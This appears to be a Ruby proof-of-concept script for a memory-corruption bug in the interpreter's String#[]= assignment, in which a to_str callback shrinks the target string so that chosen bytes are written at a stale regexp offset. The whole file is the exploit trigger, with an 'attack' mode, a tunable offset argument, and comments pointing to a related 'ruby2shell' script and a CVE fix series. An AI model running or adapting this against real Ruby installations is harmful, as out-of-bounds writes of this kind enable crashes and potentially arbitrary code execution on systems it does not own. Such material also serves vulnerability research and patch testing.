# Adjacent Ruby 3.4.12 -> 3.4.13 candidate (same fix series as
# CVE-2026-132825). vlen == len: the to_str callback returns three bytes, so
# the negative-size memmove of ruby2shell-backref-stale.rb is skipped and the
# chosen bytes are written at the stale regexp offset. Stock String#[]= only;
# no monkey patch, tracer, debugger or wire request. ARGV[0] = mode:OFFSET.
mode, offset_s = ARGV[0].to_s.split(":")
mode ||= "attack"
offset = Integer(offset_s || "700")
s = ("a" * offset + "abc" + "d" * 300).dup
shrink = (mode == "attack")
repl = Object.new
repl.define_singleton_method(:to_str) do
  s.replace("X") if shrink
  "ZQJ"
end
begin
  s[/abc/] = repl
  shown = s.bytesize <= 16 ? s.inspect : "#{s[0, 4].inspect}...(len=#{s.bytesize})"
  puts "ok len=#{s.bytesize} #{shown}"
rescue => e
  puts "raised #{e.class}: #{e.message}"
end
